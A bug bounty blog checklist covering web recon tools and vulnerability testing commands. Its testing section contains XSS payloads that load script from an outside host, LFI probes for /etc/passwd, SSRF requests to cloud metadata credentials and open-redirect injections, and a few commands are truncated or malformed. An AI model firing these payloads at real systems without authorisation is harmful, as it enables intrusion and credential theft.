---
title: Web Checklist - Recon
date: 2025-12-17 00:00:00 +0000
categories: [Bug Bounty]
tags: [bug bounty, recon, web security, checklist]
---


- [ ] Finding Subdomains  
```bash
subfinder -d example.com -all -recursive -o subs_subfinder.txt
assetfinder --subs-only example.com > subs_assetfinder.txt
findomain -t example.com | tee subs_findomain.txt

amass enum -passive -d example.com | awk -F']' '{print $NF}' | sort -u > subs_amass.txt
amass enum -active  -d example.com | awk -F']' '{print $NF}' | sort -u >> subs_amass.txt
```

- [ ] Public Sources (Manual/Custom)
```bash
curl -s "https://crt.sh/?q=%25.example.com&output=json" | jq -r '.[].name_value' | sed 's/^\*\.//' | sort -u > subs_crtsh.txt

curl -s "http://web.archive.org/cdx/search/cdx?url=*.example.com/*&output=text&fl=original&collapse=urlkey" |
 sed -E 's_https?://__;s/\/.*//;s/:.*//' | sed 's/^www\.//' | sort -u > subs_wayback.txt

curl -s "https://urlscan.io/api/v1/search/?q=domain:example.com&size=10000" |
 jq -r '.results[]?.page?.domain' | sort -u > subs_urlscan.txt

curl -s "https://otx.alienvault.com/api/v1/indicators/hostname/example.com/passive_dns" |
 jq -r '.passive_dns[]?.hostname' | sort -u > subs_alienvault.txt

```
Make sure to configure all API keys.

- [ ] GitHub Subdomain Scraping
```bash
github-subdomains -d domain.com -t [github_token]
```

- [ ] Shodan-Powered Subdomain Finder
```bash
# Single domain  
shosubgo -d target.com -s YourAPIKEY  
  
# Multiple domains from file  
shosubgo -f domains.txt -s YourAPIKEY
```
**Extract and Scan:** Now for the magic. I use a custom bookmarklet I wrote that automatically fetches all the IP addresses from the Shodan results and downloads them as a .txt file. Here is the that bookmarklet script.
#### for ip’s:
```javascript
javascript:(function(){var ipElements=document.querySelectorAll('strong');var ips=[];ipElements.forEach(function(e){ips.push(e.innerHTML.replace(/["']/g,''))});var ipsString=ips.join('\n');var a=document.createElement('a');a.href='data:text/plain;charset=utf-8,'+encodeURIComponent(ipsString);a.download='ip.txt';document.body.appendChild(a);a.click();})();
```
#### for domains:
```javascript
javascript:(function(){var ipElements=document.querySelectorAll('strong'),ips=[],domains=[];ipElements.forEach(function(e){var t=e.innerHTML.replace(/['"]/g,'').trim();/^(\d{1,3}\.){3}\d{1,3}$/.test(t)?ips.push(t):/^(?!\d+\.)[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(t)&&domains.push(t)});var dataString=%27IPs:\n%27+ips.join(%27\n%27)+%27\n\nDomains:\n%27+domains.join(%27\n%27),a=document.createElement(%27a%27);a.href=%27data:text/plain;charset=utf-8,%27+encodeURIComponent(dataString);a.download=%27domains.txt%27;document.body.appendChild(a);a.click();})();
```
Once you have the file, you can feed it directly into **Nuclei** for automated scanning. Simply replace the tags or template name with the one relevant to your CVE. In minutes, Nuclei will scan the entire list and highlight any vulnerable hosts.

```bash
cat ip.txt | nuclei -tags grafana -bs 50 -c 50 -es info
```

- [ ]  Subdomain Permutation & DNS Resolution
```bash
subfinder -d example.com | alterx | dnsx > subs_perm.txt
echo example.com | alterx -enrich | dnsx > subs_perm_enrich.txt
echo example.com | alterx -pp word=/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt | dnsx > subs_perm_wordlist.txt
```
This will generate all possible permutations of the given domain that might not be found through other sources. It then resolves them and returns only the live active subdomains using dnsx tool

- [ ] Merge & Deduplicate
```bash
cat *.txt | sort -u > merged_subdomains.txt
```
Next, combine all the subdomain files into a single organized list and eliminate duplicates using the following command:

- [ ] Discover Live Hosts (httpx)
After gathering a large number of subdomains and IPs from various sources, the next step is to filter out the live and accessible ones using the **httpx-toolkit**
```bash
cat merged_subdomains.txt | httpx-toolkit -ports 80,443,8080,8000,8888 -threads 200 > subs_alive.txt

httpx -l merged_subdomains.txt \
 -ports 3306,5432,6379,27017,15672,9090 \
 -o alive_ports.txt
```

---
After enumerating subdomains, a great way to expand your attack surface is by identifying related infrastructure owned by the target organization. This includes discovering additional domains, IP ranges and subdomains associated with the company. The amass intel module is perfect for this task. These commands help you **map out the organization’s digital footprint** based on organization names, IP ranges (CIDRs) and ASNs (Autonomous System Numbers).

- [ ] ASN & IP Discovery
```bash
asnmap -d example.com | dnsx -silent -resp-only > asn_ips.txt
```

- [ ] Asset Discovery (Amass Intel)

```bash
amass intel -org "nasa"
amass intel -active -cidr 159.69.129.82/32
amass intel -active -asn [asnno]
```

- [ ]  Harvesting IP Addresses Linked to Domains
```bash
curl -s "https://www.virustotal.com/vtapi/v2/domain/report?domain=<DOMAIN>&apikey=[api]" | jq -r '.. | .ip_address? // empty'

curl -s "https://otx.alienvault.com/api/v1/indicators/hostname/<DOMAIN>/url_list?limit=500&page=1" | jq -r '.url_list[]?.result?.urlworker?.ip // empty'

curl -s "https://urlscan.io/api/v1/search/?q=domain:<DOMAIN>&size=10000" | jq -r '.results[]?.page?.ip // empty'
```
This section covers multiple techniques to extract IP addresses linked to domains using public APIs, historical data and search engines. helping you uncover backend infrastructure and allowing you to resolve and test each IP for active services.

- [ ] Brute-Forcing Subdomains 
```bash
ffuf -u "https://FUZZ.target.com" -w wordlist.txt -mc 200,301,302
```

- [ ] Directory & File Bruteforce
```bash
ffuf -w directory-list.txt -u https://example.com/FUZZ -fc 400,401,403,404 -recursion -e .html,.php,.txt -t 100
```

- [ ] Visual Recon (Aquatone)
```bash
cat ip.txt | aquatone
cat ip.txt | aquatone -ports 80,443,8000,8080,8443
```
Once you have a list of live domains, tools like **Aquatone** help you by capturing visual screenshots of each site’s homepage. This gives you a quick overview of your targets, helping you spot login pages, admin panels, staging environments and more all at a glance.

- [ ] Port Scanning IP discovery
```
### Port Scanning with Naabu

naabu -list ip.txt -c 50 -nmap-cli 'nmap -sV -SC' -o naabu-full.txt

### Nmap full scan

nmap -p- --min-rate 1000 -T4 -A target.com -oA fullscan

### Masscan for speed

masscan -p0-65535 target.com --rate 100000 -oG masscan-results.txt

### Basic Web Vuln Scan
nikto -h alive_subdomains.txt -output nikto_results.txt
```

---

 - [ ] URL Crawling
**Active:**
```
# Katana deep recursion
katana -u subs_alive.txt -d 3 -o urls_crawled_katana.txt -js

# Hakrawler recursive crawl
cat subs_alive.txt | hakrawler -depth 3 -plain | sort -u >> urls_crawled_hakrawler.txt
```

**Passive:**
```
# GAU + Wayback + historical archives
cat subs_alive.txt | gau | waybackurls | urldedupe > urls_crawled_gau_wayback.txt

# URLFinder (legacy/optional)
urlfinder -d example.com | sort -u > urls_crawled_urlfinder.txt

```

 - [ ] Merge all into one master list
```bash
cat urls_crawled_*.txt | sort -u > allurls.txt
```

- [ ] Parameter Extraction
Once you’ve collected a large list of URLs during recon, the next step is to extract only those URLs that contain parameters. ideal targets for testing vulnerabilities like XSS, SQLi, Open Redirect and for running **Nuclei DAST** templates.
```bash
cat allurls.txt | grep '=' | urldedupe | tee param_extract_urldedupe.txt
cat allurls.txt | grep -E '\?[^=]+=.+$'
```

- [ ] Sensitive File Discovery
From the collected URLs, we can identify potentially sensitive files (e.g., backups, config files, logs) that may lead to information disclosure vulnerabilities a common yet impactful bug category worth reporting.
```bash
cat allurls.txt | grep -E "\.xls|\.xml|\.xlsx|\.json|\.pdf|\.sql|\.doc|\.docx|\.pptx|\.txt|\.zip|\.tar\.gz|\.tgz|\.bak|\.7z|\.rar|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.gz|\.config|\.csv|\.yaml|\.md|\.md5" 
 
cat allurls.txt | grep -E "\.(xls|xml|xlsx|json|pdf|sql|doc|docx|pptx|txt|zip|tar\.gz|tgz|bak|7z|rar|log|cache|secret|db|backup|yml|gz|config|csv|yaml|md|md5|tar|xz|7zip|p12|pem|key|crt|csr|sh|pl|py|java|class|jar|war|ear|sqlitedb|sqlite3|dbf|db3|accdb|mdb|sqlcipher|gitignore|env|ini|conf|properties|plist|cfg)$"  
site:*.example.com (ext:doc OR ext:docx OR ext:odt OR ext:pdf OR ext:rtf OR ext:ppt OR ext:pptx OR ext:csv OR ext:xls OR ext:xlsx OR ext:txt OR ext:xml OR ext:json OR ext:zip OR ext:rar OR ext:md OR ext:log OR ext:bak OR ext:conf OR ext:sql)
```
This regex filters URLs that end with file extensions commonly associated with sensitive documents, configuration files, or backups, often a goldmine for information disclosure vulnerabilities.

- [ ] Hidden Parameter Discovery (Arjun)
Passive:
```bash
arjun -u https://site.com/endpoint.php -oT arjun_output.txt -t 10 --rate-limit 10 --passive -m GET,POST
```

Active:
```bash
arjun -u https://site.com/endpoint.php -oT arjun_output.txt -m GET,POST -w burp-parameter-names.txt -t 10 --rate-limit 10
```


- [ ] JavaScript Recon
```
# 1. Collect URLs from multiple sources
cat subdomains_alive.txt | gau > urls_gau.txt
cat subdomains_alive.txt | waybackurls > urls_wayback.txt
katana -u subdomains_alive.txt -d 3 -ps > urls_katana.txt
hakrawler -url subdomains_alive.txt -depth 3 -plain > urls_hakrawler.txt

# 2. Merge all URLs into a master file
cat urls_gau.txt urls_wayback.txt urls_katana.txt urls_hakrawler.txt | sort -u > allurls_js.txt

# 3. Extract all JS files
grep -E "\.js$" allurls_js.txt | sort -u > jsfiles_all.txt

# 4. Validate live JS files
cat jsfiles_all.txt | httpx-toolkit -mc 200 -content-type | grep -E "application/javascript|text/javascript" | cut -d' ' -f1 > jsfiles_alive.txt

# 5. Parse JS files for endpoints
# LinkFinder
cat jsfiles_alive.txt | xargs -n1 -P20 python3 /path/to/LinkFinder.py -i - -o js_endpoints_linkfinder.txt

# JSFinder (alternative / parallel)
cat jsfiles_alive.txt | xargs -n1 -P20 python3 /path/to/jsfinder.py -i - -o js_endpoints_jsfinder.txt

# Merge endpoints
cat js_endpoints_linkfinder.txt js_endpoints_jsfinder.txt | sort -u > js_endpoints_all.txt

# 6. Scan JS files for sensitive keys and tokens
cat jsfiles_alive.txt | xargs -n1 -P20 curl -s | grep -E "aws_access_key|aws_secret_key|api key|passwd|pwd|heroku|slack|firebase|swagger|password|ftp password|jdbc|db|sql|secret|config|admin|json|gcp|htaccess|.env|ssh key|access key|secret token|oauth_token|oauth_token_secret" > js_sensitive_keys.txt

# 7. Optional: run nuclei on live JS files for exposures
cat jsfiles_alive.txt | nuclei -t /home/spy/tools/nuclei-templates/http/exposures/ -c 30 > js_nuclei_exposures.txt
```
JavaScript files often contain valuable information such as hidden API endpoints, internal functions, parameter names, hardcoded credentials, tokens, even sensitive keys and Development comments and debugging information. Analyzing these files can give deep insight into the application’s logic and uncover attack surfaces that aren’t visible in the frontend.

#### HTML content Filtering
```bash
echo domain | gau | grep -Eo '(\/[^\/]+)\.(php|asp|aspx|jsp|jsf|cfm|pl|perl|cgi|htm|html)$' | httpx -status-code -mc 200 -content-type | grep -E 'text/html|application/xhtml+xml'
```

#### JavaScript content Filtering
```bash
echo domain | gau | grep '\.js$' | httpx -status-code -mc 200 -content-type | grep 'ap
```
Filter content based on MIME types to identify JS or HTML pages for further analysis. This helps you focus on files that are most likely to contain valuable endpoints, parameters or client-side logic worth analyzing further.



## Vulnerability Discovery
After collecting all domains and URLs, it’s time to move from information gathering to actual testing. This is where recon meets exploitation. Now use the data you’ve collected to start testing for real vulnerabilities using different tools and techniques.

- [ ] GF Pattern Filtering
helps you filter URLs based on patterns commonly associated with vulnerabilities like XSS, SQLi, LFI, SSRF, Open Redirect and more.
By using predefined or custom patterns, you can quickly extract high-priority URLs from large recon files. making your workflow faster and more targeted for example:
```bash
cat allurls.txt | gf sqli
```


- [ ] SQLi Recon
```
for possible SQL technology detection:  
subfinder -dL subdomains.txt -all -silent | httpx-toolkit -td -sc -silent | grep -Ei 'asp|php|jsp|jspx|aspx'  
  
for single domain:  
subfinder -d http://example.com -all -silent | httpx-toolkit -td -sc -silent | grep -Ei 'asp|php|jsp|jspx|aspx'

for possible SQL Endpoints:  
echo http://site.com | gau | uro | grep -E ".php|.asp|.aspx|.jspx|.jsp" | grep -E '\?[^=]+=.+$'
```



- [ ] XSS Detection
```bash
echo "target.com" | gau | gf xss | uro | httpx -silent | Gxss -p Rxss | dalfox  
echo "example.com" | gau | qsreplace '<sCript>confirm(1)</sCript>' | xsschecker -match '<sCript>confirm(1)</sCript>' -vuln  
echo https://example.com/ | gau | gf xss | uro | Gxss | kxss | tee xss_output.txt  
cat xss_output.txt | grep -oP '^URL: \K\S+' | sed 's/=.*/=/' | sort -u > final.txt
```

- [ ] XSS Testing Using FFUF Request Mode
```bash
ffuf -request xss -request-proto https -w /root/wordlists/xss-payloads.txt -c -mr "<script>alert('XSS')</script>"
```

- [ ] Blind XSS Testing
```bash
cat urls.txt | grep -E "(login|signup|register|forgot|password|reset)" | httpx -silent | nuclei -t nuclei-templates/vulnerabilities/xss/ -severity critical,high

subfinder -d example.com | gau | bxss -payload '"><script src=https://xss.report/c/coffinxp></script>' -header "X-Forwarded-For"  
subfinder -d example.com | gau | grep "&" | bxss -appendMode -payload '"><script src=https://xss.report/c/coffinxp></script>' -parameters  
cat xss_params.txt | dalfox pipe --blind https://your-collaborator-url --waf-bypass --silence
```




- [ ] LFI Testing
```
Automated LFI discovery:  
nuclei -l subs.txt -t /root/nuclei-templates/http/vulnerabilities/generic/generic-linux-lfi.yaml -c 30                                                                                        
echo "https://example.com/" | gau | gf lfi | uro | sed 's/=.*/=/' | qsreplace "FUZZ" | sort -u | xargs -I{} ffuf -u {} -w payloads/lfi.txt -c -mr "root:(x|\*|\$[^\:]*):0:0:" -v  

gau target.com | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'  
  
Alternative LFI method:  
echo 'https://example.com/index.php?page=' | httpx-toolkit -paths payloads/lfi.txt -threads 50 -random-agent -mc 200 -mr "root:(x|\*|\$[^\:]*):0:0:"  

echo "https://example.com/" | gau | gf lfi | uro | sed 's/=.*/=/' | qsreplace "FUZZ" | sort -u | xargs -I{} ffuf -u {} -w payloads/lfi.txt -c -mr "root:(x|\*|\$[^\:]*):0:0:" -v
```
#### Key components:
- gf lfi: Filters URLs potentially vulnerable to LFI
- qsreplace “FUZZ”: Replaces parameter values with FUZZ keyword
- ffuf: Fast web fuzzer for testing payloads
- -mr “root:(x|\*|\$[^\:]*):0:0:”: Matches Linux passwd file format

- [ ] LFI testing Using FFUF Request Mode
```bash
ffuf -request lfi -request-proto https -w /root/wordlists/offensive\ payloads/LFI\ payload.txt -c -mr "root:"
```




- [ ] CORS Testing
```
### Manual CORS testing using curl

curl -H "Origin: http://example.com" -I https://domain.com/wp-json/

### Detailed CORS analysis

curl -H "Origin: http://example.com" -I https://domain.com/wp-json/ | grep -i -e "access-control-allow-origin" -e "access-control-allow-methods" -e "access-control-allow-credentials"

### Automated CORS testing:

cat example.coms.txt | httpx -silent | nuclei -t nuclei-templates/vulnerabilities/cors/ -o cors_results.txt  

python3 corsy.py -i subdomains_alive.txt -t 10 --headers "User-Agent: GoogleBot\nCookie: SESSION=Hacked"  

python3 CORScanner.py -u https://example.com -d -t 10
```



- [ ] Subdomain Takeover Detection
```
subzy run --targets subdomains.txt --concurrency 100 --hide_fails --verify_ssl

socialhunter -f alive_subdomains.txt
```
- Testing multiple service providers
- Verifying SSL certificates
- Using high concurrency for speed
- Hiding failed attempts to reduce noise





- [ ] .git Exposure
```bash
cat domains.txt | grep "SUCCESS" | gf urls | httpx-toolkit -sc -server -cl -path "/.git/" -mc 200 -location -ms "Index of" -probe
```
Exposed .git/ directories can leak sensitive information like source code, credentials and internal logic making them a high-severity issue. This command helps identify .git exposures by filtering valid URLs, probing for the .git/ path and checking for directory listings or exposed content.





- [ ] SSRF Payload Testing
```
# Look for common SSRF-prone parameters in URLs  
  
cat urls.txt | grep -E 'url=|uri=|redirect=|next=|data=|path=|dest=|proxy=|file=|img=|out=|continue=' | sort -u  
  
# Look for API/webhook integrations or cloud metadata patterns  
cat urls.txt | grep -i 'webhook\|callback\|upload\|fetch\|import\|api' | sort -u  
  
# Nuclei for automated scanning  
cat urls.txt | nuclei -t nuclei-templates/vulnerabilities/ssrf/

# Basic SSRF to local services  
curl "https://target.com/page?url=http://127.0.0.1:80/"  
curl "https://target.com/page?url=http://localhost:8080"  
  
# Target internal cloud metadata  
curl "https://target.com/api?endpoint=http://169.254.169.254/latest/meta-data/"  
curl "https://target.com/api?endpoint=http://169.254.169.254/latest/meta-data/iam/security-credentials/"  
  
# Bypass filters with alternative IP formats  
http://127.0.0.1%23.google.com  
http://127.1  
http://[::1]/   
http://0x7f000001  
http://017700000001  
  
# DNS rebinding or callback for blind SSRF  
curl "https://target.com/page?url=http://yourdomain.burpcollaborator.net"
```




- [ ] Open Redirect Testing
```bash
cat final.txt | grep -Pi "returnUrl=|continue=|dest=|destination=|forward=|go=|goto=|login\?to=|login_url=|logout=|next=|next_page=|out=|g=|redir=|redirect=|redirect_to=|redirect_uri=|redirect_url=|return=|returnTo=|return_path=|return_to=|return_url=|rurl=|site=|target=|to=|uri=|url=|qurl=|rit_url=|jump=|jump_url=|originUrl=|origin=|Url=|desturl=|u=|Redirect=|location=|ReturnUrl=|redirect_url=|redirect_to=|forward_to=|forward_url=|destination_url=|jump_to=|go_to=|goto_url=|target_url=|redirect_link=" | tee redirect_params.txt

final.txt | gf redirect | uro | sort -u | tee redirect_params.txt  
  
cat redirect_params.txt | qsreplace "https://evil.com" | httpx-toolkit -silent -fr -mr "evil.com"  
  
subfinder -d vulnweb.com -all | httpx-toolkit -silent | gau | gf redirect | uro | qsreplace "https://evil.com" | httpx-toolkit -silent -fr -mr "evil.com"

cat redirect_params.txt | while read url; do cat loxs/payloads/or.txt | while read payload; do echo "$url" | qsreplace "$payload"; done; done | httpx-toolkit -silent -fr -mr "google.com"  
  
echo target.com -all | gau | gf redirect | uro | while read url; do cat loxs/payloads/or.txt | while read payload; do echo "$url" | qsreplace "$payload"; done; done | httpx-toolkit -silent -fr -mr "google.com"  
  
subfinder -d target.com -all | httpx-toolkit -silent | gau | gf redirect | uro | while read url; do cat loxs/payloads/or.txt | while read payload; do echo "$url" | qsreplace "$payload"; done; done | httpx-toolkit -silent -fr -mr "google.com"
```

One liner open redirect
```bash
subfinder -d domain.com -all -o subdomain.txt cat subdomain.txt | httpx -o filter.txt  echo https://wrc.t-mobile.com | gau --threads 102 | tee urls.txt cat urls.txt | gf or | sed 's/=.*/=/' | grep '?redirect_uri' | uro > open.txt
```
- Finds subdomains 
- Checks which subdomains are alive.
- Scrapes all URLs from a target subdomain (`wrc.t-mobile.com`).
- Filters URLs likely vulnerable to Open Redirect.
- Prepares parameters for payload injection.
- Deduplicates and saves them to `open.txt`.

##  Conclusion

Recon → URLs → Params → Tests → Report

|Tool/Script|Purpose|Type|
|---|---|---|
|`subfinder`|Subdomain enumeration (API integrations, recursive search)|Recon Tool|
|`assetfinder`|Passive subdomain enumeration|Recon Tool|
|`findomain`|Fast subdomain discovery|Recon Tool|
|`amass`|Passive + active subdomain & asset discovery (intel module)|Recon Tool|
|`crt.sh` (curl+jq)|Fetch subdomains from Certificate Transparency logs|Public Source|
|`Wayback Machine` (curl)|Extract historical subdomains and URLs|Public Source|
|`virustotal` (curl)|Fetch domain siblings / IPs from VirusTotal API|Public Source/API|
|`github-subdomains`|Extract subdomains from GitHub repositories|Recon Tool|
|`shosubgo`|Subdomain discovery using Shodan API|Recon Tool|
|`alterx`|Generate subdomain permutations|Recon Tool|
|`dnsx`|DNS resolution & validation of subdomains|Recon Tool|
|`ffuf`|Subdomain brute force, directory fuzzing, XSS/LFI testing|Fuzzer|
|`asnmap`|Map ASN to discover IP ranges and related domains|Recon Tool|
|`httpx-toolkit`|Live host detection, probe ports, content-type filtering|Web Scanner|
|`aquatone`|Visual reconnaissance (screenshots of hosts)|Recon Tool|
|`katana`|Web crawling & JavaScript discovery|Crawler|
|`hakrawler`|Lightweight web crawler for endpoints|Crawler|
|`gau`|Collect URLs from multiple archives (Wayback, CommonCrawl)|Recon Tool|
|`urlfinder`|Discover URLs from a given domain|Recon Tool|
|`gf` (Gf-Patterns)|Extract URLs/params based on vuln patterns (XSS, SQLi, etc.)|Filtering Tool|
|`nuclei`|Vulnerability scanner with customizable templates|Vuln Scanner|
|`arjun`|Discover hidden GET/POST parameters|Param Fuzzer|
|`dirsearch`|Directory & file brute force discovery|Fuzzer|
|`wpscan`|WordPress recon (plugins, themes, users)|CMS Scanner|
|`naabu`|Fast port scanning (integrates with Nmap)|Network Scanner|
|`nmap`|Port scanning, service detection, vuln scripts|Network Scanner|
|`masscan`|Ultra-fast port scanner|Network Scanner|
|`uro`|URL deduplication / normalization|URL Tool|
|`Gxss`|Reflected XSS discovery helper|XSS Tool|
|`dalfox`|Advanced XSS scanner & automation|XSS Tool|
|`bxss`|Blind XSS testing automation|XSS Tool|
|`kxss`|XSS helper to find reflected params|XSS Tool|
|`qsreplace`|Replace URL parameters with payloads|Fuzzer Utility|
|`Corsy`|Automated CORS misconfiguration scanner|Vuln Scanner|
|`CORScanner`|CORS misconfiguration detection|Vuln Scanner|
|`subzy`|Subdomain takeover detection|Takeover Scanner|
|`curl` (manual)|Used throughout for CORS, SSRF, file checks, etc.|Manual Tool|



